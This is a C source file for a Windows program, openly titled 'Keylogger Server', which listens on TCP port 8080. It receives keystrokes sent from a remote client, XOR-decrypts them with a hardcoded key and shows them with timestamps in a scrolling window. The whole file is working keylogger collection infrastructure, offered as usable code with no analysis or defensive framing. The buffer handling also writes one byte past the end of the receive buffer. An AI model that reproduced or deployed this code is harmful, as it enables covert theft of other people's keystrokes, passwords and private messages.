#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib") // Link Winsock library

#define PORT 8080
#define WM_SOCKET (WM_USER + 1)
#define MAX_BUFFER 8192
#define ENCRYPTION_KEY "S3cr3tK3y"

char displayBuffer[MAX_BUFFER] = {0};
HWND mainWindow;
SOCKET server_fd, client_socket;
RECT clientRect;
HFONT hFont;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void InitServer(HWND hwnd);
void decryptData(char *data);
void GetCurrentTimeString(char *timeStr, int maxLen);

// Scrollbar variables
int scrollY = 0;           // Current scroll position
int totalHeight = 0;       // Total content height
int clientHeight = 0;      // Visible client area height

void GetCurrentTimeString(char *timeStr, int maxLen) {
    time_t now;
    time(&now);
    struct tm *tm_info = localtime(&now);
    strftime(timeStr, maxLen, "[%H:%M:%S] ", tm_info);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Register window class
    const char CLASS_NAME[] = "Server Window Class";
    
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.style = CS_HREDRAW | CS_VREDRAW;  // Redraw on resize
    
    RegisterClass(&wc);

    // Create window
    mainWindow = CreateWindowEx(
        0,
        CLASS_NAME,
        "Keylogger Server",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT,
        800, 600,
        NULL,
        NULL,
        hInstance,
        NULL
    );

    if (mainWindow == NULL) {
        return 0;
    }

    // Create font
    hFont = CreateFont(
        16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
        DEFAULT_PITCH | FF_DONTCARE,
        "Consolas"
    );

    ShowWindow(mainWindow, nCmdShow);
    UpdateWindow(mainWindow);
    InitServer(mainWindow);

    // Message loop
    MSG msg = {0};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(hFont);
    return 0;
}

void InitServer(HWND hwnd) {
    WSADATA wsa;
    struct sockaddr_in server_addr;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        MessageBox(hwnd, "Failed to initialize Winsock", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    // Create socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        MessageBox(hwnd, "Socket creation failed", "Error", MB_OK | MB_ICONERROR);
        WSACleanup();
        return;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Bind socket
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        MessageBox(hwnd, "Bind failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    // Listen for connections
    if (listen(server_fd, 3) == SOCKET_ERROR) {
        MessageBox(hwnd, "Listen failed", "Error", MB_OK | MB_ICONERROR);
        closesocket(server_fd);
        WSACleanup();
        return;
    }

    // Associate socket with window message
    WSAAsyncSelect(server_fd, hwnd, WM_SOCKET, FD_ACCEPT | FD_READ | FD_CLOSE);
}

void decryptData(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

void UpdateScrollbar(HWND hwnd) {
    SCROLLINFO si = { sizeof(SCROLLINFO) };
    si.fMask = SIF_RANGE | SIF_PAGE | SIF_POS;
    si.nMin = 0;
    si.nMax = totalHeight;
    si.nPage = clientHeight;
    si.nPos = scrollY;
    SetScrollInfo(hwnd, SB_VERT, &si, TRUE);
}

void CalculateTotalHeight(HDC hdc) {
    RECT calcRect = {0, 0, clientRect.right - 40 - 20, 0};  // Account for margins and scrollbar
    SelectObject(hdc, hFont);
    DrawText(hdc, displayBuffer, -1, &calcRect, DT_WORDBREAK | DT_CALCRECT);
    totalHeight = calcRect.bottom + 40;  // Add margin
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Create vertical scrollbar
            CreateWindow("SCROLLBAR", "", WS_CHILD | WS_VISIBLE | SBS_VERT,
                0, 0, 0, 0, hwnd, (HMENU)1, GetModuleHandle(NULL), NULL);
            return 0;
        }

        case WM_SIZE: {
            GetClientRect(hwnd, &clientRect);
            clientHeight = clientRect.bottom - clientRect.top;
            
            // Position scrollbar
            MoveWindow(GetDlgItem(hwnd, 1), 
                clientRect.right - GetSystemMetrics(SM_CXVSCROLL), 0,
                GetSystemMetrics(SM_CXVSCROLL), clientHeight, TRUE);
            
            UpdateScrollbar(hwnd);
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;
        }

        case WM_VSCROLL: {
            SCROLLINFO si = { sizeof(SCROLLINFO), SIF_ALL };
            GetScrollInfo(hwnd, SB_VERT, &si);
            
            int oldPos = scrollY;
            switch (LOWORD(wParam)) {
                case SB_TOP: scrollY = 0; break;
                case SB_BOTTOM: scrollY = si.nMax; break;
                case SB_LINEUP: scrollY -= 10; break;
                case SB_LINEDOWN: scrollY += 10; break;
                case SB_PAGEUP: scrollY -= si.nPage; break;
                case SB_PAGEDOWN: scrollY += si.nPage; break;
                case SB_THUMBTRACK: scrollY = si.nTrackPos; break;
            }
            
            scrollY = max(0, min(scrollY, si.nMax - (int)si.nPage + 1));
            if (scrollY != oldPos) {
                SetScrollPos(hwnd, SB_VERT, scrollY, TRUE);
                InvalidateRect(hwnd, NULL, TRUE);
            }
            return 0;
        }

        case WM_MOUSEWHEEL: {
            int delta = GET_WHEEL_DELTA_WPARAM(wParam) / WHEEL_DELTA;
            scrollY -= delta * 30;
            scrollY = max(0, min(scrollY, totalHeight - clientHeight));
            SetScrollPos(hwnd, SB_VERT, scrollY, TRUE);
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;
        }

        case WM_SOCKET: {
            if (WSAGETSELECTERROR(lParam)) {
                closesocket((SOCKET)wParam);
                return 0;
            }

            switch (WSAGETSELECTEVENT(lParam)) {
                case FD_ACCEPT: {
                    client_socket = accept(server_fd, NULL, NULL);
                    if (client_socket == INVALID_SOCKET) {
                        MessageBox(hwnd, "Accept failed", "Error", MB_OK | MB_ICONERROR);
                        return 0;
                    }
                    WSAAsyncSelect(client_socket, hwnd, WM_SOCKET, FD_READ | FD_CLOSE);
                    break;
                }
                
                case FD_READ: {
                    char buffer[1024] = {0};
                    int bytes_read = recv(client_socket, buffer, sizeof(buffer), 0);
                    if (bytes_read > 0) {
                        buffer[bytes_read] = '\0';
                        decryptData(buffer);
                        
                        char timeStr[32] = {0};
                        GetCurrentTimeString(timeStr, sizeof(timeStr));

                        if (buffer[0] == '\b') {
                            int len = strlen(displayBuffer);
                            if (len > 0) {
                                displayBuffer[len - 1] = '\0';
                            }
                        } else {
                            if (strlen(displayBuffer) + strlen(buffer) + strlen(timeStr) < MAX_BUFFER - 1) {
                                strcat(displayBuffer, timeStr);
                                strcat(displayBuffer, buffer);
                                strcat(displayBuffer, "\n");
                            }
                        }

                        // --- SCROLL UPDATE START ---
                        HDC hdc = GetDC(hwnd);
                        CalculateTotalHeight(hdc);
                        ReleaseDC(hwnd, hdc);
                        UpdateScrollbar(hwnd);
                        
                        // Auto-scroll to bottom if near end
                        if (totalHeight - scrollY < clientHeight * 2) {
                            scrollY = totalHeight - clientHeight;
                            SetScrollPos(hwnd, SB_VERT, scrollY, TRUE);
                        }
                        // --- SCROLL UPDATE END ---
                        
                        InvalidateRect(hwnd, NULL, TRUE);
                    }
                    break;
                }

                case FD_CLOSE: {
                    closesocket(client_socket);
                    break;
                }
            }
            return 0;
        }

        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            
            HDC hdcMem = CreateCompatibleDC(hdc);
            HBITMAP hbmMem = CreateCompatibleBitmap(hdc, clientRect.right, clientRect.bottom);
            SelectObject(hdcMem, hbmMem);
            
            FillRect(hdcMem, &clientRect, (HBRUSH)(COLOR_WINDOW+1));
            SelectObject(hdcMem, hFont);
            SetBkMode(hdcMem, TRANSPARENT);
            
            RECT textRect = {
                20,
                20 - scrollY,
                clientRect.right - 40,
                clientRect.bottom + totalHeight
            };
            
            DrawText(hdcMem, displayBuffer, -1, &textRect, DT_WORDBREAK | DT_NOCLIP);
            BitBlt(hdc, 0, 0, clientRect.right, clientRect.bottom, hdcMem, 0, 0, SRCCOPY);
            
            DeleteObject(hbmMem);
            DeleteDC(hdcMem);
            EndPaint(hwnd, &ps);
            return 0;
        }

        case WM_DESTROY: {
            closesocket(client_socket);
            closesocket(server_fd);
            WSACleanup();
            PostQuitMessage(0);
            return 0;
        }

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
}